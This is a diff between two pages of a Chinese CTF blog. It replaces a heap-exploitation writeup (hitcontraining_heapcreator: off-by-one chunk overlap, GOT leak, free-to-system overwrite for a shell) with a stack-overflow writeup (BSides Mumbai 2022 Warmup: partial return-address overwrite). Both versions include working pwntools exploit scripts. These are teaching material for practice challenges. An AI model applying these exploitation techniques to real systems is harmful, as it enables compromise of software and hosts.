@@ -8,7 +8,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1">
 
 
-<title>hitcontraining_heapcreator - P3troL1er的个人博客</title>
+<title>【BSides Mumbai 2022 PWN】Warmup - P3troL1er的个人博客</title>
 
 <meta name="generator" content="Hugo Eureka 0.9.3" />
 <link rel="stylesheet" href="https://peterliuzhi.top/css/eureka.min.9cec6350e37e534b0338fa9a085bf06855de3b0f2dcf857e792e5e97b07ea905d4d5513db554cbc26a9c3da622bae92d.css">
@@ -116,7 +116,7 @@
 <link rel="apple-touch-icon" sizes="180x180" href="https://peterliuzhi.top/images/selficon_hu7999937fb0799ea2efe2916a84368012_9703_180x180_fill_q75_box_center.jpg">
 
 <meta name="description"
-  content="关于BUUCTF hitcontraining_heapcreator的解析">
+  content="关于【BSides Mumbai 2022 PWN】Warmup的解析">
 <script type="application/ld+json">
 {
   "@context": "https://schema.org",
@@ -128,8 +128,8 @@
       "item":"https://peterliuzhi.top/writeup/"},{
       "@type": "ListItem",
       "position": 2 ,
-      "name":"hitcontraining_heapcreator",
-      "item":"https://peterliuzhi.top/writeup/hitcontraining_heapcreator/"}]
+      "name":"【BSides Mumbai 2022 PWN】Warmup",
+      "item":"https://peterliuzhi.top/writeup/bsides-mumbai-2022-pwnwarmup/"}]
 }
 </script>
 
@@ -141,11 +141,11 @@
     "@type": "Article",
     "mainEntityOfPage": {
         "@type": "WebPage",
-        "@id": "https://peterliuzhi.top/writeup/hitcontraining_heapcreator/"
+        "@id": "https://peterliuzhi.top/writeup/bsides-mumbai-2022-pwnwarmup/"
     },
-    "headline": "hitcontraining_heapcreator - P3troL1er的个人博客","datePublished": "2023-01-03T22:34:23+08:00",
-    "dateModified": "2023-01-03T22:34:23+08:00",
-    "wordCount":  1074 ,
+    "headline": "【BSides Mumbai 2022 PWN】Warmup - P3troL1er的个人博客","datePublished": "2023-01-04T17:09:58+08:00",
+    "dateModified": "2023-01-04T17:09:58+08:00",
+    "wordCount":  927 ,
     "publisher": {
         "@type": "Person",
         "name": "Peter Liu",
@@ -154,20 +154,20 @@
             "url": "https://peterliuzhi.top/images/selficon.jpg"
         }
         },
-    "description": "关于BUUCTF hitcontraining_heapcreator的解析"
+    "description": "关于【BSides Mumbai 2022 PWN】Warmup的解析"
 }
-</script><meta property="og:title" content="hitcontraining_heapcreator - P3troL1er的个人博客" />
+</script><meta property="og:title" content="【BSides Mumbai 2022 PWN】Warmup - P3troL1er的个人博客" />
 <meta property="og:type" content="article" />
 
 
 <meta property="og:image" content="https://peterliuzhi.top/images/selficon.jpg">
 
 
-<meta property="og:url" content="https://peterliuzhi.top/writeup/hitcontraining_heapcreator/" />
+<meta property="og:url" content="https://peterliuzhi.top/writeup/bsides-mumbai-2022-pwnwarmup/" />
 
 
 
-<meta property="og:description" content="关于BUUCTF hitcontraining_heapcreator的解析" />
+<meta property="og:description" content="关于【BSides Mumbai 2022 PWN】Warmup的解析" />
 
 
 
@@ -183,10 +183,10 @@
 
 
 
-<meta property="article:published_time" content="2023-01-03T22:34:23&#43;08:00" />
+<meta property="article:published_time" content="2023-01-04T17:09:58&#43;08:00" />
 
 
-<meta property="article:modified_time" content="2023-01-03T22:34:23&#43;08:00" />
+<meta property="article:modified_time" content="2023-01-04T17:09:58&#43;08:00" />
 
 
 
@@ -195,13 +195,11 @@
 
 <meta property="article:tag" content="pwn" />
 
-<meta property="article:tag" content="chunk overlap" />
-
-<meta property="article:tag" content="off by one" />
 
 
 
 
+<meta property="og:see_also" content="https://peterliuzhi.top/writeup/hitcontraining_heapcreator/" />
 
 <meta property="og:see_also" content="https://peterliuzhi.top/tricks/glibc-source-code%E6%BA%90%E7%A0%81/" />
 
@@ -212,8 +210,6 @@
 <meta property="og:see_also" content="https://peterliuzhi.top/tricks/%E8%B0%83%E8%AF%95arm%E7%A8%8B%E5%BA%8F/" />
 
 <meta property="og:see_also" content="https://peterliuzhi.top/tricks/%E8%BE%83%E4%B8%BA%E7%AE%80%E7%9F%AD%E7%9A%84shellcode/" />
-
-<meta property="og:see_also" content="https://peterliuzhi.top/tricks/patchelf%E6%9B%B4%E6%94%B9libc%E8%84%9A%E6%9C%AC/" />
 
 
 </head>
@@ -337,7 +333,7 @@
       class=" bg-secondary-bg col-span-2 rounded px-6 py-8 lg:col-span-6"
     >
       <article class="prose">
-  <h1 class="mb-4">hitcontraining_heapcreator</h1>
+  <h1 class="mb-4">【BSides Mumbai 2022 PWN】Warmup</h1>
 
   <div
   class="text-tertiary-text not-prose mt-2 flex flex-row flex-wrap items-center"
@@ -345,12 +341,12 @@
   <div class="me-6 my-2">
     <i class="fas fa-calendar me-1"></i>
     <span
-      >Tuesday, January 3, 2023</span
+      >Wednesday, January 4, 2023</span
     >
   </div>
   <div class="me-6 my-2">
     <i class="fas fa-clock me-1"></i>
-    <span>3分钟阅读时长</span>
+    <span>2分钟阅读时长</span>
   </div>
 
   
@@ -359,6 +355,12 @@
       
         <a href="https://peterliuzhi.top/categories/writeup/" class="hover:text-eureka"
           >writeup</a
+        >
+      
+        
+          <span>, </span>
+        <a href="https://peterliuzhi.top/categories/bsides-mumbai/" class="hover:text-eureka"
+          >BSides Mumbai</a
         >
       
     </div>
@@ -372,18 +374,6 @@
           >pwn</a
         >
       
-        
-          <span>, </span>
-        <a href="https://peterliuzhi.top/tags/chunk-overlap/" class="hover:text-eureka"
-          >chunk overlap</a
-        >
-      
-        
-          <span>, </span>
-        <a href="https://peterliuzhi.top/tags/off-by-one/" class="hover:text-eureka"
-          >off by one</a
-        >
-      
     </div>
   
 
@@ -395,36 +385,25 @@
   
 
   <blockquote>
-<p>No man is free who is not master of himself.
-— <cite>Epictetus</cite></p>
+<p>When I let go of what I am, I become what I might be.
+— <cite>Laozi</cite></p>
 </blockquote>
-<p><a href="https://buuoj.cn/challenges#hitcontraining_heapcreator">原题链接</a></p>
+<p><a href="/appendix/BSides_Mumbai_chall">附件程序：BSides_Mumbai_chall</a></p>
 <h1 id="checksec查看程序架构">checksec查看程序架构</h1>
-<p><img src="/image/Pasted%20image%2020230103223727.png" alt=""></p>
+<p><img src="/image/Pasted%20image%2020230104172833.png" alt=""></p>
 <h1 id="ida查看伪c代码">ida查看伪C代码</h1>
-<p><img src="/image/Pasted%20image%2020230103223850.png" alt=""></p>
-<h2 id="create_heap">create_heap</h2>
-<p><img src="/image/Pasted%20image%2020230103224017.png" alt=""></p>
-<p>分配的chunk结构体包括一个保存size的int，和一个指向其他内存的指针：</p>
-<p><img src="/image/Pasted%20image%2020230103224316.png" alt=""></p>
-<p>其中第二个chunk的大小是任意的，这上面就可以做文章</p>
-<h2 id="edit_heap">edit_heap</h2>
-<p><img src="/image/Pasted%20image%2020230103224048.png" alt=""></p>
-<p>我们可以看到，最后读取到的内容会比保存的大小多1：</p>
-<p><img src="/image/Pasted%20image%2020230103224635.png" alt=""></p>
-<p>如果我们分配的大小刚刚好涵盖了<code>prev_size</code>这个域，那么我们的输入就可以更改下一个chunk的<code>size</code>域</p>
-<h2 id="show_heap">show_heap</h2>
-<p><img src="/image/Pasted%20image%2020230103224105.png" alt=""></p>
-<p>看到这个函数，我们马上想到，如果将<code>heaparray[v1]-&gt;ptr</code>改成某个函数的got值，就可以泄露出libc基址</p>
-<h2 id="delete_heap">delete_heap</h2>
-<p><img src="/image/Pasted%20image%2020230103224125.png" alt=""></p>
-<p>这个函数在释放后会将指针归零，因此用不了UAF</p>
-<h1 id="大致思路">大致思路</h1>
-<p>这道题的关键是我们要获得更改<code>heaparray[v1]-&gt;ptr</code>这个指针的能力，而显而易见的，最明显的溢出漏洞在edit_heap那里有一个off by one漏洞，我们可以更改下一个chunk的size域，让它覆盖掉下面几个chunk，这样释放后再分配的时候就能获得更改被覆盖的chunk的权利</p>
-<h2 id="chunk-overlap">chunk overlap</h2>
-<p>更多阅读：<a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/chunk-extend-overlapping/">Chunk Extend and Overlapping - CTF Wiki</a></p>
-<p><img src="/image/2023%E5%B9%B41%E6%9C%883%E6%97%A5.drawio.png" alt=""></p>
-<p>需要注意的是，我们输入的size是0x18，但是由于size位的存在，最后分配得到的chunk大小是0x20</p>
+<p><img src="/image/Pasted%20image%2020230104172932.png" alt=""></p>
+<p>我们可以通过程序给的printf来得到buf的地址，也就是栈地址</p>
+<p><img src="/image/Pasted%20image%2020230104173034.png" alt=""></p>
+<p>在vuln函数中有一个明显的栈溢出漏洞，但是它能溢出的长度很微妙，没有办法直接调用win函数，因为win函数要求多个参数：</p>
+<p><img src="/image/Pasted%20image%2020230104173202.png" alt=""></p>
+<p>但我们知道，虽然64位系统的函数调用的前六个参数是保存在寄存器中的，但是我们看win函数的汇编代码，最后还是要读到栈中，因此我们可以先将三个参数安排在栈中，同时控制rbp的值，跳过将参数读入到栈中的过程：</p>
+<p><img src="/image/Pasted%20image%2020230104173507.png" alt=""></p>
+<p>但是还有一个问题，我们只能读入0x2C个字节，同时因为PIE的存在，我们不知道win函数的实际地址，这该怎么在vuln函数中转入win函数？</p>
+<p>我们调试发现，vuln函数原本的返回地址是main+104，而win函数恰好在main下面：</p>
+<p><img src="/image/Pasted%20image%2020230104174009.png" alt=""></p>
+<p><img src="/image/Pasted%20image%2020230104174034.png" alt=""></p>
+<p>又因为页机制的存在，函数地址的最后三位是不变的，所以我们只需要更改最后一个字节就好</p>
 <h1 id="exp">exp</h1>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># 自动生成头部</span>
 </span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
@@ -432,10 +411,10 @@
 </span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="n">LibcSearcher</span>
 </span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">ctypes</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">pss</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="kc">True</span>
-</span></span><span class="line"><span class="cl"><span class="n">fn</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&#34;./heapcreator&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">libc_name</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&#34;/home/kali/share/share_files/security/buuctf_libc/libc-2.23_64.so&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">port</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&#34;26654&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">pss</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl"><span class="n">fn</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&#34;./BSides-chall&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc_name</span><span class="p">:</span><span class="nb">str</span> <span class="o">=</span> <span class="s2">&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">port</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&#34;1337&#34;</span>
 </span></span><span class="line"><span class="cl"><span class="n">if_32</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="kc">False</span>
 </span></span><span class="line"><span class="cl"><span class="n">if_debug</span><span class="p">:</span><span class="nb">bool</span> <span class="o">=</span> <span class="kc">False</span>
 </span></span><span class="line"><span class="cl"><span class="n">pg</span> <span class="o">=</span> <span class="n">p32</span> <span class="k">if</span> <span class="n">if_32</span> <span class="k">else</span> <span class="n">p64</span>
@@ -444,15 +423,16 @@
 </span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;tmux&#34;</span><span class="p">,</span> <span class="s2">&#34;splitw&#34;</span><span class="p">,</span> <span class="s2">&#34;-h&#34;</span><span class="p">]</span>
 </span></span><span class="line"><span class="cl"><span class="n">env</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;LD_PRELOAD&#34;</span><span class="p">:</span> <span class="n">libc_name</span><span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">pss</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;node4.buuoj.cn&#34;</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;34.70.253.176&#34;</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">if_debug</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">        <span class="n">p</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="n">fn</span><span class="p">,</span> <span class="s2">&#34;&#34;&#34;
-</span></span></span><span class="line"><span class="cl"><span class="s2">                        break main
+</span></span></span><span class="line"><span class="cl"><span class="s2">                        b* $rebase(0x1320)
+</span></span></span><span class="line"><span class="cl"><span class="s2">                        b* $rebase(0x131A)
 </span></span></span><span class="line"><span class="cl"><span class="s2">                        c
 </span></span></span><span class="line"><span class="cl"><span class="s2">                        &#34;&#34;&#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">fn</span><span class="p">,</span> <span class="n">env</span><span class="o">=</span><span class="n">env</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">fn</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="c1"># 两个elf，注意libc的版本</span>
 </span></span><span class="line"><span class="cl"><span class="n">m_elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">fn</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">libc_name</span><span class="p">)</span>
@@ -482,7 +462,7 @@
 </span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">interactive_after_clean</span><span class="p">(</span><span class="n">timeout</span><span class="p">:</span><span class="nb">int</span> <span class="o">=</span> <span class="mf">0.05</span><span class="p">,</span> <span class="n">no_show</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="kc">True</span><span class="p">):</span>
 </span></span><span class="line"><span class="cl">    <span class="n">received</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">clean</span><span class="p">(</span><span class="n">timeout</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">no_show</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;received:</span><span class="se">\n</span><span class="si">{</span><span class="n">received</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;UTF-8&#39;</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;received:</span><span class="se">\n</span><span class="si">{</span><span class="n">received</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">c_val</span><span class="p">(</span><span class="n">value</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">c_type</span><span class="p">:</span> <span class="n">string</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
@@ -563,58 +543,21 @@
 </span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">eval</span><span class="p">(</span><span class="n">formula</span><span class="p">)),</span> <span class="n">encoding</span><span class="o">=</span><span class="s2">&#34;UTF-8&#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="o">...</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">allocate</span><span class="p">(</span><span class="n">size</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">content</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">    <span class="n">sendline_after_clean</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="c1"># sendline_after_clean(str(index))</span>
-</span></span><span class="line"><span class="cl">    <span class="n">sendline_after_clean</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
-</span></span><span class="line"><span class="cl">    <span class="n">sendline_after_clean</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">remove</span><span class="p">(</span><span class="n">index</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">    <span class="n">sendline_after_clean</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;4&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="n">sendline_after_clean</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
-</span></span><span class="line"><span class="cl">    
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">index</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">    <span class="n">sendline_after_clean</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;3&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="n">sendline_after_clean</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">change</span><span class="p">(</span><span class="n">index</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">content</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">newline</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">    <span class="n">sendline_after_clean</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;2&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="n">sendline_after_clean</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">newline</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="n">sendline_after_clean</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="n">send_after_clean</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">allocate</span><span class="p">(</span><span class="mh">0x18</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;0&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">allocate</span><span class="p">(</span><span class="mh">0x18</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">allocate</span><span class="p">(</span><span class="mh">0x18</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;2&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span>
-</span></span><span class="line"><span class="cl">    <span class="s2">&#34;/bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">    <span class="mi">0</span>
-</span></span><span class="line"><span class="cl"><span class="p">])</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0x81</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">change</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="kc">False</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">remove</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">allocate</span><span class="p">(</span><span class="mh">0x70</span><span class="p">,</span> <span class="n">flat</span><span class="p">([</span>
-</span></span><span class="line"><span class="cl">    <span class="n">pg</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">    <span class="mi">8</span><span class="p">,</span> <span class="n">m_elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;free&#39;</span><span class="p">]</span>
-</span></span><span class="line"><span class="cl"><span class="p">]))</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">show</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">free_got</span> <span class="o">=</span> <span class="n">recv_and_transform</span><span class="p">(</span><span class="s2">&#34;Content : &#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">base_addr</span> <span class="o">=</span> <span class="n">free_got</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;free&#39;</span><span class="p">]</span>
-</span></span><span class="line"><span class="cl"><span class="n">system_addr</span> <span class="o">=</span> <span class="n">base_addr</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">sendline_after_clean</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">stack</span> <span class="o">=</span> <span class="n">recv_and_transform</span><span class="p">(</span><span class="s2">&#34;0x&#34;</span><span class="p">,</span> <span class="n">from_bytes</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">bound</span><span class="o">=</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">suclog</span><span class="p">(</span>
-</span></span><span class="line"><span class="cl">    <span class="n">free_got</span><span class="o">=</span><span class="n">free_got</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">    <span class="n">base_addr</span><span class="o">=</span><span class="n">base_addr</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">    <span class="n">system_addr</span><span class="o">=</span><span class="n">system_addr</span>
+</span></span><span class="line"><span class="cl">    <span class="n">stack</span><span class="o">=</span><span class="n">stack</span>
 </span></span><span class="line"><span class="cl"><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">change</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">pg</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
-</span></span><span class="line"><span class="cl"><span class="n">remove</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span>
+</span></span><span class="line"><span class="cl">    <span class="n">stack</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p32</span><span class="p">(</span><span class="mi">11534522</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1590475454</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">])</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span> <span class="o">+</span> <span class="n">flat</span><span class="p">([</span>
+</span></span><span class="line"><span class="cl">    <span class="n">stack</span> <span class="o">-</span> <span class="mi">38</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p8</span><span class="p">(</span><span class="mh">0x8E</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">send_after_clean</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">    
-</span></span><span class="line"><span class="cl"><span class="n">interactive_after_clean</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">interactive_after_clean</span><span class="p">(</span><span class="n">no_show</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
 </span></span></code></pre></div>
 </article>
 
@@ -624,17 +567,13 @@
     
     <a href="https://peterliuzhi.top/tags/pwn/" class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#pwn</a>
     
-    <a href="https://peterliuzhi.top/tags/chunk-overlap/" class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#chunk overlap</a>
-    
-    <a href="https://peterliuzhi.top/tags/off-by-one/" class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#off by one</a>
-    
 </div>
       
 
       
   <div class="flex md:justify-end my-4">
 
-    <a href="https://github.com/PeterLiu-all/peterliu-all.github.io/content/writeup/hitcontraining_heapcreator.md" title="Edit this page">
+    <a href="https://github.com/PeterLiu-all/peterliu-all.github.io/content/writeup/%e3%80%90BSides%20Mumbai%202022%20PWN%e3%80%91Warmup.md" title="Edit this page">
       <i class="fas fa-edit me-1"></i>
       <span>编辑本页</span>
     </a>
@@ -651,16 +590,11 @@
   >
     <div>
       
-        <span class="text-primary-text block font-bold"
-          >上一页</span
-        >
-        <a href="https://peterliuzhi.top/writeup/bsides-mumbai-2022-pwnwarmup/" class="block">【BSides Mumbai 2022 PWN】Warmup</a>
-      
     </div>
     <div class="mt-4 md:mt-0 md:text-right">
       
         <span class="text-primary-text block font-bold">下一页</span>
-        <a href="https://peterliuzhi.top/writeup/ciscn_2019_n_3/" class="block">ciscn_2019_n_3</a>
+        <a href="https://peterliuzhi.top/writeup/hitcontraining_heapcreator/" class="block">hitcontraining_heapcreator</a>
       
     </div>
   </div>
@@ -711,19 +645,7 @@
   <nav id="TableOfContents">
   <ul>
     <li><a href="#checksec查看程序架构">checksec查看程序架构</a></li>
-    <li><a href="#ida查看伪c代码">ida查看伪C代码</a>
-      <ul>
-        <li><a href="#create_heap">create_heap</a></li>
-        <li><a href="#edit_heap">edit_heap</a></li>
-        <li><a href="#show_heap">show_heap</a></li>
-        <li><a href="#delete_heap">delete_heap</a></li>
-      </ul>
-    </li>
-    <li><a href="#大致思路">大致思路</a>
-      <ul>
-        <li><a href="#chunk-overlap">chunk overlap</a></li>
-      </ul>
-    </li>
+    <li><a href="#ida查看伪c代码">ida查看伪C代码</a></li>
     <li><a href="#exp">exp</a></li>
   </ul>
 </nav>
@@ -745,6 +667,9 @@
       >
         <h3>相关</h3>
         
+          <a href="https://peterliuzhi.top/writeup/hitcontraining_heapcreator/" class="no-underline">hitcontraining_heapcreator</a>
+          <br />
+        
           <a href="https://peterliuzhi.top/tricks/glibc-source-code%E6%BA%90%E7%A0%81/" class="no-underline">glibc source code源码</a>
           <br />
         
@@ -758,9 +683,6 @@
           <br />
         
           <a href="https://peterliuzhi.top/tricks/%E8%BE%83%E4%B8%BA%E7%AE%80%E7%9F%AD%E7%9A%84shellcode/" class="no-underline">较为简短的shellcode</a>
-          <br />
-        
-          <a href="https://peterliuzhi.top/tricks/patchelf%E6%9B%B4%E6%94%B9libc%E8%84%9A%E6%9C%AC/" class="no-underline">patchelf更改libc脚本</a>
           <br />
         
       </div>
